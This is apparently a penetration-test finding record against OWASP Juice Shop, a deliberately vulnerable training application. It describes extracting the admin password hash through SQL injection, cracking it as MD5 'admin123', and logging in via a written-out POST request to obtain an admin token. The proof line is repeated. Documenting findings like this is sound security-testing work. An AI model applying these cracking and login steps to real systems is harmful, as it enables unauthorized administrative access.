title: Weak/Default Credentials - Admin Password Easily Crackable (MD5)
description: The admin account (admin@juice-sh.op) uses a weak password that is easily cracked. The password hash 0192023a7bbd73250516f069df18b500 was extracted via SQL injection and immediately identified as MD5("admin123"). The password was confirmed by successfully logging in via POST /rest/user/login, which returned a 200 OK with a valid JWT token for an admin role user. This allows full administrative access to the application.
poc: 1. SQLi extract: admin@juice-sh.op hash 0192023a7bbd73250516f069df18b500\n2. Crack: echo -n "admin123" | md5sum → 0192023a7bbd73250516f069df18b500 ✓\n3. Verify: POST /rest/user/login {"email":"admin@juice-sh.op","password":"admin123"} → 200 OK with admin JWT token
proof: Hash crack: echo -n "admin123" | md5sum → 0192023a7bbd73250516f069df18b500 (matches extracted hash). Login: POST /rest/user/login {"email":"admin@juice-sh.op","password":"admin123"} → HTTP 200 {"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...","bid":1,"umail":"admin@juice-sh.op"}}

Login: POST /rest/user/login {"email":"admin@juice-sh.op","password":"admin123"} → HTTP 200 {"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...","bid":1,"umail":"admin@juice-sh.op"}}
